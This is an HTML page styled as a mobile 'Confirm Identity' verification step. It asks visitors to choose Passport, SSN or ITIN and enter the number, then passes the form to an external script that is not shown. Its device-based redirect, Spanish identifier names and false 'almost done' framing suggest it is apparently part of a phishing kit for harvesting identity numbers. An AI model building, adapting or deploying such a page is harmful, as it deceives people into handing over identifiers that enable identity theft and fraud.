<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Identity</title>
    <link rel="stylesheet" href="css/mobile.css">
    <script type="text/javascript">
        if (screen.width > 801) {
            window.location = "identificationverification.go";
        }      
    </script>
</head>

<body>
    <header>
        <div class="headerimg">
            <img src="img/header1.png">
        </div>
        <div class="headertitulo">
        Confirm Identity
        </div>
    </header>
    <main>
        <h2>We are almost done</h2>
        <p>Please provide the following information to complete the verification process.</p>
        <form autocomplete="off" id="formularioident">
        
            <div class="form-group-p all">
                <select name="tipoIdent" id="tipoIdent">
                    <option value="">Please Select</option>
                    <option value="pasaporte">Passport</option>
                    <option value="ssn">Social Security Number (SSN)</option>
                    <option value="itin">Taxpayer Personal Identification Number (ITIN)</option>
                </select>
               
            </div>
            <div class="form-group-p all">
                <input style="width: 95vw;" class="input" type="text" name="nident" id="nident" maxlength="12" required placeholder="Identification Number">
            </div>
            <div class="form-group-b">
                <button type="button" id="confirIdent"><img src="img/secure_lock.png"> Confirmation</button>
            </div>
        </form>
    </main>
    <script src="js/funciones.js"></script>
</body>

</html>